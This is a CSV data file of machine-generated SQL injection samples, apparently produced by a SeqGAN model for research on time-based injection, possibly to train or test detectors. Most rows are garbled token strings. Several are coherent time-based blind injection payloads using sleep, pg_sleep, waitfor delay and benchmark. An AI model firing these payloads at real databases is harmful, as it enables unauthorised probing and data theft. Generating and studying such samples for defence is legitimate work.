label,payload,family,payload_type,method,run_id,sample_index
attack,1%qib%in,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,332
attack, n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,333
attack,f  )   and 8514  =   K  1568   as ev,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,334
attack,"1"" or elbt     ( not  = pv",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,335
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,336
attack,benchmark  )   and elt  =  (=  )   andas,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,337
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%' and   (  't",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,338
attack,1  )    asaus e,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,339
attack,1'   )    )     )   waitfor delay ''  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,340
attack,1%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,341
attack,"1""dd  )   or   (     )   and eliq ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,342
attack,select 6967 * from pg_sleep  =   * benchmark  =  sleep,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,343
attack,1'  )   or elt   benchmark  =    (  =  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,344
attack,"1"" or (  benchmark  =     a)     )   and j  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,345
attack, 8514  select *(  0x4c4d6142s eiu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,346
attack,1%  )   and 4240    (  =    (  benchmark   k0:,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,347
attack,_,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,348
attack,1%'  =  'zo,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,349
attack,1%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,350
attack, e,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,351
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%pjhof"" like """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,352
attack,1'||  (  select 'ojpnf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,353
attack,"5select * elk(  y  (  5000000,md5  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,354
attack,select benchmark  (  sleep  (  (  5--,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,355
attack,"1""  )   )   and    ) kt    (  select * ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,356
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,357
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%zoijjpn",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,358
attack,"benchmarkj6969e"" like ""rr    as bikielinh",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,359
attack,"1""   )    rlililkhffs",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,360
attack,select * elikandielielikeki,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,361
attack,"1""   )    as where 8466  7021 6793  (    select",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,362
attack,select from or(  =     or 6793 xt  select ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,363
attack,1%%  o)   asj,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,364
attack,1%xpn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,365
attack,"1""  )   and kelieli   eleli",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,366
attack,1%zoin'  =  'nh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,367
attack,0x4c4d6142 rliqwkelbnf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,368
attack,"1%1%""  =  ""'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,369
attack,"1""  )   and elinhf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,370
attack, e)     (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,371
attack,select or 7305  =  benchmark  (  ( and    (  5  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,372
attack,"1""lzh"" like """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,373
attack,select benchmark  =  9649 (  =  benchmark and elt  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,374
attack,waitfor p  benchmark    (  0x4c4d6142    )    as pe el,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,375
attack,1%z,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,376
attack,"1""  )   (  (  or where( (  *(  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,377
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,378
attack, or 2388  select * el6383 71967305  8466  5000000),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,379
attack,1%ando'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,380
attack,1mjchzotjp'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,381
attack,select * 4240  =  7196 4240 pg_sleep  (  select * ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,382
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '  )    )    ashso_s jhf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,383
attack,1'||  (  select 'cv    i,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,384
attack,1a)eu and elhoe,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,385
attack,1%'  =  'oii'  =  'nh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,386
attack,1%f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,387
attack,11%chwjy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,388
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,389
attack,benchmark,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,390
attack,1mwhere where =    (  benchmark  (  7196 or 8485    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,391
attack,select H  (   * from or sleep  benchmark  5  7196,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,392
attack,select from --  5  r p%     ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,393
attack,1'  )    )     )   )     )   andas eiq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,394
attack,select * from (  =  =  benchmark  )   and    as,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,395
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ohohh"" like ""fooi",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,396
attack,1 where      (  5 or or 6793  =    (  select,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,397
attack,1%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,398
attack,1%fppppe'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,399
attack,1% where  s where   (  =  5000000or   as b,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,400
attack,1%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,401
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '      where (  benchmark  benchmark  1210  (    (    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,402
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,403
attack,1 or or _s efuaske        rl,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,404
attack,"select f  benchmark  (       as xi'  =  '"" like "" xi",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,405
attack,1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,406
attack,1   )    as where 8466  =  benchmark  )   (    (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,407
attack,vppor  select sleep  select s 8466 elin    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,408
attack,select pg_sleep  'rnzp'  (  )   or * eliki  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,409
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'jo,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,410
attack,select * 9649  select or  el y  benchmark  0x4c4d6142   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,411
attack,1%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,412
attack, select (  * from where 3672  * s eli,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,413
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'zh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,414
attack,"1""a and where or 6793 6175  =  benchmark  benchmark  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,415
attack,1%z0:0:5b'%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,416
attack,  (  (  )   and ikelikelt  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,417
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'shfs,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,418
attack,= or eliuahjppe,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,419
attack,1'   )    )     )   waitfor delay ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,420
attack,  sleep  )   as v'  =  '  was x_plt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,421
attack,"  )   =    as r 6175""  =  ""us ielin",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,422
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""on'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,423
attack,1')    (     )  =  6383   blin,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,424
attack,"1"" where or benchmark  7021 6793  =    (  benchmark  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,425
attack,1 where n  =  1568  )   or 4240 8466  =    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,426
attack,  or * from pg_sleep  =  (sshviu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,427
attack,1%w,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,428
attack,"0:n' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""oi'  =  '    mneselect 6793  =     r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,429
attack,1%ot'  =  'n pu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,430
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,431
attack,1  (  ) where  (    (    (    (  =     *,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,432
attack,select 3672   (  5  )   where 6175    )    (    (    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,433
attack,select 2841  select and elik    (  select * 8594,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,434
attack,1   )    )    asiusoelkefs ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,435
attack,1%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,436
attack,select 8594 * 20445  benchmark(    select * pg_sleep  select,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,437
attack,select 4240 * * from   (  (  5000000(  5   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,438
attack,1%hnb,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,439
attack, and  =  7196 and *   (  select *   (    (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,440
attack,  2239 * _K euselel,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,441
attack,"1"" a       and eldhfawa yf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,442
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,443
attack,1'or t  =  benchmark  )   (    (             (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,444
attack,1%vpi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,445
attack,select 6969 benchmark  =  6175  benchmark  1210  =  benchmark  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,446
attack,1'+  (  select 'z,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,447
attack, d '  =  ' and elta,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,448
attack,1%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,449
attack,1%0,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,450
attack,select 6793 elt  benchmark  5  rss ikel,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,451
attack,1%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,452
attack,1%zot'  =  'hfi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,453
attack,1'   )     )   and where e elt xas,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,454
attack,e  )   or 8466 3824  =    (  m  (  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,455
attack,select  (   (  select * 4240  =  2239 benchmark  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,456
attack,"1%""aw0dselect 6793 8514  =  benchmark  1568  m",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,457
attack,"1%"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,458
attack,1w'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,459
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'zhf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,460
attack,w'  =  ' 4240 e)    as where 6793  (  select sleep,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,461
attack,"  (  md  =  benchmark  =       ""wucy"" and 8514  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,462
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '   )    )    and elike5(  select or,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,463
attack,1'+  (  select '  )   rliq kelt     (         and,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,464
attack,  7021  benchmark  )   or where 9008  6175  =        as,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,465
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'zo,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,466
attack,select (   4240 4683  (  benchmark  (    (select or ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,467
attack,1%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,468
attack,"1%""  =  ""'  =  '""  select hq where benchmark  =  8667  sleep",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,469
attack, p or or and 1132 benchmark  =    (  select *,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,470
attack,1%q'  =  'tw where 8466     (  select     4683 el,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,471
attack,select benchmark 7021 679363835  (  select * elik,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,472
attack,(  benchmark  sleep  )1132 (  0x4c4d6142 6793md     where ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,473
attack,"1""  )   and    )lt  =  (  )   or b",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,474
attack,1'   )    )     )   waitfor delay ''  =  'crXt'  =  ' bm'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,475
attack,1   )    as xaf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,476
attack,) sleep  )   where 6175  (  benchmark  (  1210  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,477
attack,1 where   (  select and 3672  4683  (    (  select ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,478
attack,vinvt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,479
attack,"1""  benchmark   (  )   or   (  select * 4240  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,480
attack,select and 8466  select where (  select * or el,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,481
attack,"1%%zoin'  =  'h'  =  'zoin'  =  '"" like ""ot",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,482
attack,  )   as x,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,483
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  ')lihvi'  =  'oi'  =  'n'  =  'h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,484
attack,1%zt,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,485
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,486
attack,"1 where  lh' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%hf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,487
attack,  (  select and 4240  =  select y 8466    (  5,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,488
attack,kbenchmark(  (  5  )   where 9008  =  6175  = ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,489
attack,( pif%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,490
attack, or elh where 8252    =  1568 or or ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,491
attack,1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'w,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,492
attack, n  )   or elieve,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,493
attack,select 4240 * 4240  =  =   6793( (   pg_sleep,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,494
attack,"1""   )     )   and    and    m'wyvx'  7305    (  1210  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,495
attack,select or 4240  =  '%'  =  benchmark  )   s x  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,496
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,497
attack,  select 6793 eli jt  7279 where where (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,498
attack,1%zhi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,499
